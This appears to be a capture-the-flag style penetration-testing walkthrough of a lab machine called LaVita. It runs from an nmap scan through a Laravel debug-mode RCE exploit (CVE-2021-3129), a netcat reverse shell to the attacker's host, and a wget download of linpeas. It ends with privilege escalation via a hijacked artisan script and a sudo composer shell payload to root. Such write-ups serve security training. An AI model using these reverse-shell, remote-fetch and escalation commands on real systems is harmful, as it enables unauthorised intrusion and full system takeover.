## NMAP

```nmap-LaVita
??$ nmap -sC -sV 192.168.59.38 -oA LaVita
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-08 17:28 UTC
Nmap scan report for 192.168.59.38
Host is up (0.0030s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-title: W3.CSS Template
|_http-server-header: Apache/2.4.56 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.18 seconds
```

## Port 80

Laravel 8.4.0 in use
Searchsploit shows an [RCE](https://www.ambionics.io/blog/laravel-debug-rce) 

```searchsploit-laravel
??$ searchsploit -m 49424
  Exploit: Laravel 8.4.2 debug mode - Remote code execution
      URL: https://www.exploit-db.com/exploits/49424
     Path: /usr/share/exploitdb/exploits/php/webapps/49424.py
    Codes: CVE-2021-3129
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/kali/49424.py
```

No luck

Dirbuster shows login and register paths
Used Burpsuite

Nevermind above, just registered a user and logged in as it
Able to enable debugging and have an image upload section

enabled debugging to try original exploit, no luck

Found Another [Exploit](https://github.com/joshuavanderpoll/CVE-2021-3129.git)
This one worked (needed to reset machine once)

executed nc reverse shell:

```nc-revshell
nc -c sh 192.168.49.59 9000
```

==LOCAL==
Ran

``` TTY-SHELLSPAWN
python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm-256color
```

Sent over linpeas.sh by:

```python-file-send
python3 -m http.server 80
```

followed by:

```
wget http://192.168.49.59/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
```

## Privilege Escalation

Ran linpeas from /tmp

Found that lavita database.config using env vars for database password

found database password in `env`

```
www-data@debian:/$ env
env
DB_PASSWORD=sdfquelw0kly9jgbx92
```

DB_USER was in env as lavita
nothing useful in DB though

no cron processes, used [pspy](https://github.com/DominicBreuker/pspy):

```
2024/06/08 14:51:01 CMD: UID=1001  PID=17416  | sh -c stty -a | grep columns 
2024/06/08 14:51:01 CMD: UID=1001  PID=17415  | stty -a 
2024/06/08 14:51:01 CMD: UID=1001  PID=17417  | /usr/bin/php /var/www/html/lavita/artisan clear:pictures         
```

skunk user is running lavita/artisan

We have write perm on artisan:
```
-rwxr-xr-x  1 www-data www-data    1686 Nov 10  2020 artisan
```


Modified artisan to be the PHP IvanSineck shell from revshells

Got shell as skunk user

==Skunk User==

For root, ran `sudo -l`

```
skunk@debian:~$ sudo -l
sudo -l
Matching Defaults entries for skunk on debian:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User skunk may run the following commands on debian:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/composer --working-dir\=/var/www/html/lavita *
```

searched for composer in [GTFOBins](https://gtfobins.github.io/)
```
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > composer.json
```

```
skunk@debian:~$ sudo -u root /usr/bin/composer --working-dir\=/var/www/html/lavita run-script x
<er --working-dir\=/var/www/html/lavita run-script x
Do not run Composer as root/super user! See https://getcomposer.org/root for details                                                                      
Continue as root/super user [yes]? y
y
> /bin/sh -i 0<&3 1>&3 2>&3
# ls
ls
app            composer.lock  package-lock.json  resources   storage
artisan        config         phpunit.xml        rev.sh      tests
bootstrap      database       public             routes      vendor
composer.json  package.json   README.md          server.php  webpack.mix.js
# whoami
whoami
root
# cd ~
cd ~
# ls
ls
email7.txt  proof.txt
# cat proof.txt
cat proof.txt
c36fcfff7333e6b9e4c4fd8057d91ed2
```